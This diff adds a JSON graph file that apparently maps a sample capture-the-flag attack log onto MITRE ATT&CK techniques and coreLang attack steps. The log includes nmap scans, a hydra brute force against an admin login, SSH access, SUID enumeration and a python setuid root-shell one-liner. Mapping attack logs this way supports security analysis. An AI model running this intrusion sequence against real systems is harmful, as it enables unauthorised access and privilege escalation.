@@ -1,0 +1,1034 @@
+{
+  "meta": {
+    "total_entries": 13,
+    "source_files": [
+      "example.txt"
+    ]
+  },
+  "nodes": [
+    {
+      "id": "cmd::0",
+      "layer": "command",
+      "label": "nmap -Pn -T4 -p- 10.10.10.5",
+      "entry_id": 0,
+      "source_file": "example.txt",
+      "command": "nmap -Pn -T4 -p- 10.10.10.5",
+      "reasoning": "Starting enumeration of the target machine.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 0,
+        "tool": "nmap",
+        "action": "reconnaissance",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nmap -Pn -T4 -p- 10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 0,
+        "technique_id": "T1046",
+        "technique_name": "T1046",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 0,
+        "asset": "Network",
+        "step": "networkScanning",
+        "full": "Network.networkScanning",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_corelang": "#4e9af1"
+    },
+    {
+      "id": "cmd::1",
+      "layer": "command",
+      "label": "nmap -sV -sC -p 22,80,3306 10.10.10.5",
+      "entry_id": 1,
+      "source_file": "example.txt",
+      "command": "nmap -sV -sC -p 22,80,3306 10.10.10.5",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 1,
+        "tool": "nmap",
+        "action": "reconnaissance",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nmap -sV -sC -p 22,80,3306 10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 1,
+        "technique_id": "T1046",
+        "technique_name": "T1046",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 1,
+        "asset": "Network",
+        "step": "networkScanning",
+        "full": "Network.networkScanning",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_corelang": "#4e9af1"
+    },
+    {
+      "id": "cmd::2",
+      "layer": "command",
+      "label": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/di",
+      "entry_id": 2,
+      "source_file": "example.txt",
+      "command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt",
+      "reasoning": "Found port 80 open with Apache. Let's check for web vulnerabilities.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 2,
+        "tool": "gobuster",
+        "action": "reconnaissance",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt"
+      },
+      "mitre": {
+        "entry_id": 2,
+        "technique_id": "T1083",
+        "technique_name": "T1083",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 2,
+        "asset": "Application",
+        "step": "accessApplication",
+        "full": "Application.accessApplication",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_corelang": "#e8884a"
+    },
+    {
+      "id": "cmd::3",
+      "layer": "command",
+      "label": "nikto -h http://10.10.10.5",
+      "entry_id": 3,
+      "source_file": "example.txt",
+      "command": "nikto -h http://10.10.10.5",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 3,
+        "tool": "nikto",
+        "action": "reconnaissance",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nikto -h http://10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 3,
+        "technique_id": "T1190",
+        "technique_name": "T1190",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 3,
+        "asset": "NetworkService",
+        "step": "networkServiceScanning",
+        "full": "NetworkService.networkServiceScanning",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_corelang": "#20b2aa"
+    },
+    {
+      "id": "cmd::4",
+      "layer": "command",
+      "label": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.",
+      "entry_id": 4,
+      "source_file": "example.txt",
+      "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form \"/admin/login:username=^USER^&password=^PASS^:Invalid\"",
+      "reasoning": "Discovered /admin login page. Trying default credentials first, then brute force.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 4,
+        "tool": "hydra",
+        "action": "exploitation",
+        "target": "",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form \"/admin/login:username=^USER^&password=^PASS^:Invalid\""
+      },
+      "mitre": {
+        "entry_id": 4,
+        "technique_id": "T1110",
+        "technique_name": "T1110",
+        "tactic": "credential-access",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 4,
+        "asset": "Credentials",
+        "step": "bruteForce",
+        "full": "Credentials.bruteForce",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#da77f2",
+      "color_corelang": "#c97fc9"
+    },
+    {
+      "id": "cmd::5",
+      "layer": "command",
+      "label": "ssh admin@10.10.10.5",
+      "entry_id": 5,
+      "source_file": "example.txt",
+      "command": "ssh admin@10.10.10.5",
+      "reasoning": "Got credentials admin:password123. Logging in via SSH.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 5,
+        "tool": "ssh",
+        "action": "exploitation",
+        "target": "",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "ssh admin@10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 5,
+        "technique_id": "T1078",
+        "technique_name": "T1078",
+        "tactic": "initial-access",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 5,
+        "asset": "Credentials",
+        "step": "authenticate",
+        "full": "Credentials.authenticate",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#c97fc9",
+      "color_corelang": "#c97fc9"
+    },
+    {
+      "id": "cmd::6",
+      "layer": "command",
+      "label": "whoami",
+      "entry_id": 6,
+      "source_file": "example.txt",
+      "command": "whoami",
+      "reasoning": "Checking what we have access to.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 6,
+        "tool": "whoami",
+        "action": "post-exploitation",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "whoami"
+      },
+      "mitre": {
+        "entry_id": 6,
+        "technique_id": "T1033",
+        "technique_name": "T1033",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 6,
+        "asset": "Host",
+        "step": "compromise",
+        "full": "Host.compromise",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_corelang": "#f1c94e"
+    },
+    {
+      "id": "cmd::7",
+      "layer": "command",
+      "label": "id",
+      "entry_id": 7,
+      "source_file": "example.txt",
+      "command": "id",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 7,
+        "tool": "id",
+        "action": "post-exploitation",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "id"
+      },
+      "mitre": {
+        "entry_id": 7,
+        "technique_id": "T1033",
+        "technique_name": "T1033",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 7,
+        "asset": "Host",
+        "step": "compromise",
+        "full": "Host.compromise",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_corelang": "#f1c94e"
+    },
+    {
+      "id": "cmd::8",
+      "layer": "command",
+      "label": "sudo -l",
+      "entry_id": 8,
+      "source_file": "example.txt",
+      "command": "sudo -l",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 8,
+        "tool": "sudo",
+        "action": "post-exploitation",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "sudo -l"
+      },
+      "mitre": {
+        "entry_id": 8,
+        "technique_id": "T1059",
+        "technique_name": "T1059",
+        "tactic": "execution",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 8,
+        "asset": "Host",
+        "step": "compromise",
+        "full": "Host.compromise",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#f1c94e",
+      "color_corelang": "#f1c94e"
+    },
+    {
+      "id": "cmd::9",
+      "layer": "command",
+      "label": "find / -perm -4000 -type f 2>/dev/null",
+      "entry_id": 9,
+      "source_file": "example.txt",
+      "command": "find / -perm -4000 -type f 2>/dev/null",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 9,
+        "tool": "find",
+        "action": "post-exploitation",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "find / -perm -4000 -type f 2>/dev/null"
+      },
+      "mitre": {
+        "entry_id": 9,
+        "technique_id": "T1083",
+        "technique_name": "T1083",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 9,
+        "asset": "Data",
+        "step": "read",
+        "full": "Data.read",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_corelang": "#e84a4a"
+    },
+    {
+      "id": "cmd::10",
+      "layer": "command",
+      "label": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      "entry_id": 10,
+      "source_file": "example.txt",
+      "command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      "reasoning": "Found SUID binary. Exploiting for root.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 10,
+        "tool": "python3",
+        "action": "post-exploitation",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+      },
+      "mitre": {
+        "entry_id": 10,
+        "technique_id": "T1059",
+        "technique_name": "T1059",
+        "tactic": "execution",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 10,
+        "asset": "Host",
+        "step": "compromise",
+        "full": "Host.compromise",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#f1c94e",
+      "color_corelang": "#f1c94e"
+    },
+    {
+      "id": "cmd::11",
+      "layer": "command",
+      "label": "cat /root/flag.txt",
+      "entry_id": 11,
+      "source_file": "example.txt",
+      "command": "cat /root/flag.txt",
+      "reasoning": "Got root! Reading the flag.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 11,
+        "tool": "cat",
+        "action": "post-exploitation",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "cat /root/flag.txt"
+      },
+      "mitre": {
+        "entry_id": 11,
+        "technique_id": "T1083",
+        "technique_name": "T1083",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 11,
+        "asset": "Data",
+        "step": "read",
+        "full": "Data.read",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_corelang": "#e84a4a"
+    },
+    {
+      "id": "cmd::12",
+      "layer": "command",
+      "label": "cat /home/user/user.txt",
+      "entry_id": 12,
+      "source_file": "example.txt",
+      "command": "cat /home/user/user.txt",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 12,
+        "tool": "cat",
+        "action": "post-exploitation",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "cat /home/user/user.txt"
+      },
+      "mitre": {
+        "entry_id": 12,
+        "technique_id": "T1083",
+        "technique_name": "T1083",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "corelang": {
+        "entry_id": 12,
+        "asset": "Data",
+        "step": "read",
+        "full": "Data.read",
+        "confidence": 0.7,
+        "notes": "heuristic"
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_corelang": "#e84a4a"
+    }
+  ],
+  "corelang_nodes": [
+    {
+      "id": "corelang::Network.networkScanning",
+      "layer": "corelang",
+      "label": "Network.networkScanning",
+      "asset": "Network",
+      "step": "networkScanning",
+      "full": "Network.networkScanning",
+      "color": "#4e9af1",
+      "entry_ids": [
+        0,
+        1
+      ]
+    },
+    {
+      "id": "corelang::Application.accessApplication",
+      "layer": "corelang",
+      "label": "Application.accessApplication",
+      "asset": "Application",
+      "step": "accessApplication",
+      "full": "Application.accessApplication",
+      "color": "#e8884a",
+      "entry_ids": [
+        2
+      ]
+    },
+    {
+      "id": "corelang::NetworkService.networkServiceScanning",
+      "layer": "corelang",
+      "label": "NetworkService.networkServiceScanning",
+      "asset": "NetworkService",
+      "step": "networkServiceScanning",
+      "full": "NetworkService.networkServiceScanning",
+      "color": "#20b2aa",
+      "entry_ids": [
+        3
+      ]
+    },
+    {
+      "id": "corelang::Credentials.bruteForce",
+      "layer": "corelang",
+      "label": "Credentials.bruteForce",
+      "asset": "Credentials",
+      "step": "bruteForce",
+      "full": "Credentials.bruteForce",
+      "color": "#c97fc9",
+      "entry_ids": [
+        4
+      ]
+    },
+    {
+      "id": "corelang::Credentials.authenticate",
+      "layer": "corelang",
+      "label": "Credentials.authenticate",
+      "asset": "Credentials",
+      "step": "authenticate",
+      "full": "Credentials.authenticate",
+      "color": "#c97fc9",
+      "entry_ids": [
+        5
+      ]
+    },
+    {
+      "id": "corelang::Host.compromise",
+      "layer": "corelang",
+      "label": "Host.compromise",
+      "asset": "Host",
+      "step": "compromise",
+      "full": "Host.compromise",
+      "color": "#f1c94e",
+      "entry_ids": [
+        6,
+        7,
+        8,
+        10
+      ]
+    },
+    {
+      "id": "corelang::Data.read",
+      "layer": "corelang",
+      "label": "Data.read",
+      "asset": "Data",
+      "step": "read",
+      "full": "Data.read",
+      "color": "#e84a4a",
+      "entry_ids": [
+        9,
+        11,
+        12
+      ]
+    }
+  ],
+  "mitre_nodes": [
+    {
+      "id": "mitre::T1046",
+      "layer": "mitre",
+      "label": "T1046",
+      "technique_name": "T1046",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        0,
+        1
+      ]
+    },
+    {
+      "id": "mitre::T1083",
+      "layer": "mitre",
+      "label": "T1083",
+      "technique_name": "T1083",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        2,
+        9,
+        11,
+        12
+      ]
+    },
+    {
+      "id": "mitre::T1190",
+      "layer": "mitre",
+      "label": "T1190",
+      "technique_name": "T1190",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        3
+      ]
+    },
+    {
+      "id": "mitre::T1110",
+      "layer": "mitre",
+      "label": "T1110",
+      "technique_name": "T1110",
+      "tactic": "credential-access",
+      "color": "#da77f2",
+      "entry_ids": [
+        4
+      ]
+    },
+    {
+      "id": "mitre::T1078",
+      "layer": "mitre",
+      "label": "T1078",
+      "technique_name": "T1078",
+      "tactic": "initial-access",
+      "color": "#c97fc9",
+      "entry_ids": [
+        5
+      ]
+    },
+    {
+      "id": "mitre::T1033",
+      "layer": "mitre",
+      "label": "T1033",
+      "technique_name": "T1033",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        6,
+        7
+      ]
+    },
+    {
+      "id": "mitre::T1059",
+      "layer": "mitre",
+      "label": "T1059",
+      "technique_name": "T1059",
+      "tactic": "execution",
+      "color": "#f1c94e",
+      "entry_ids": [
+        8,
+        10
+      ]
+    }
+  ],
+  "edges": [
+    {
+      "source": "cmd::0",
+      "target": "cmd::1",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::1",
+      "target": "cmd::2",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::2",
+      "target": "cmd::3",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::3",
+      "target": "cmd::4",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::4",
+      "target": "cmd::5",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::5",
+      "target": "cmd::6",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::6",
+      "target": "cmd::7",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::7",
+      "target": "cmd::8",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::8",
+      "target": "cmd::9",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::9",
+      "target": "cmd::10",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::10",
+      "target": "cmd::11",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::11",
+      "target": "cmd::12",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "corelang::Network.networkScanning",
+      "target": "corelang::Application.accessApplication",
+      "type": "sequence",
+      "layer": "corelang"
+    },
+    {
+      "source": "corelang::Application.accessApplication",
+      "target": "corelang::NetworkService.networkServiceScanning",
+      "type": "sequence",
+      "layer": "corelang"
+    },
+    {
+      "source": "corelang::NetworkService.networkServiceScanning",
+      "target": "corelang::Credentials.bruteForce",
+      "type": "sequence",
+      "layer": "corelang"
+    },
+    {
+      "source": "corelang::Credentials.bruteForce",
+      "target": "corelang::Credentials.authenticate",
+      "type": "sequence",
+      "layer": "corelang"
+    },
+    {
+      "source": "corelang::Credentials.authenticate",
+      "target": "corelang::Host.compromise",
+      "type": "sequence",
+      "layer": "corelang"
+    },
+    {
+      "source": "corelang::Host.compromise",
+      "target": "corelang::Data.read",
+      "type": "sequence",
+      "layer": "corelang"
+    },
+    {
+      "source": "mitre::T1046",
+      "target": "mitre::T1083",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1083",
+      "target": "mitre::T1190",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1190",
+      "target": "mitre::T1110",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1110",
+      "target": "mitre::T1078",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1078",
+      "target": "mitre::T1033",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1033",
+      "target": "mitre::T1059",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "cmd::0",
+      "target": "corelang::Network.networkScanning",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::0",
+      "target": "mitre::T1046",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::1",
+      "target": "corelang::Network.networkScanning",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::1",
+      "target": "mitre::T1046",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::2",
+      "target": "corelang::Application.accessApplication",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::2",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::3",
+      "target": "corelang::NetworkService.networkServiceScanning",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::3",
+      "target": "mitre::T1190",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::4",
+      "target": "corelang::Credentials.bruteForce",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::4",
+      "target": "mitre::T1110",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::5",
+      "target": "corelang::Credentials.authenticate",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::5",
+      "target": "mitre::T1078",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::6",
+      "target": "corelang::Host.compromise",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::6",
+      "target": "mitre::T1033",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::7",
+      "target": "corelang::Host.compromise",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::7",
+      "target": "mitre::T1033",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::8",
+      "target": "corelang::Host.compromise",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::8",
+      "target": "mitre::T1059",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::9",
+      "target": "corelang::Data.read",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::9",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::10",
+      "target": "corelang::Host.compromise",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::10",
+      "target": "mitre::T1059",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::11",
+      "target": "corelang::Data.read",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::11",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::12",
+      "target": "corelang::Data.read",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::12",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    }
+  ],
+  "color_maps": {
+    "corelang_asset": {
+      "Network": "#4e9af1",
+      "NetworkService": "#20b2aa",
+      "Host": "#f1c94e",
+      "Credentials": "#c97fc9",
+      "Application": "#e8884a",
+      "Data": "#e84a4a",
+      "Identity": "#a0d468",
+      "Unknown": "#888888"
+    },
+    "mitre_tactic": {
+      "reconnaissance": "#4e9af1",
+      "resource-development": "#7ec8e3",
+      "initial-access": "#c97fc9",
+      "execution": "#f1c94e",
+      "persistence": "#a0d468",
+      "privilege-escalation": "#e84a4a",
+      "defense-evasion": "#fd9644",
+      "credential-access": "#da77f2",
+      "discovery": "#e8884a",
+      "lateral-movement": "#20b2aa",
+      "collection": "#a0522d",
+      "command-and-control": "#ff6b6b",
+      "exfiltration": "#ff4757",
+      "impact": "#ff0000",
+      "none": "#888888"
+    },
+    "command_phase": {
+      "reconnaissance": "#4e9af1",
+      "exploitation": "#e84a4a",
+      "post-exploitation": "#f1c94e",
+      "lateral-movement": "#20b2aa",
+      "persistence": "#a0d468",
+      "exfiltration": "#ff4757",
+      "noise": "#555555"
+    }
+  }
+}
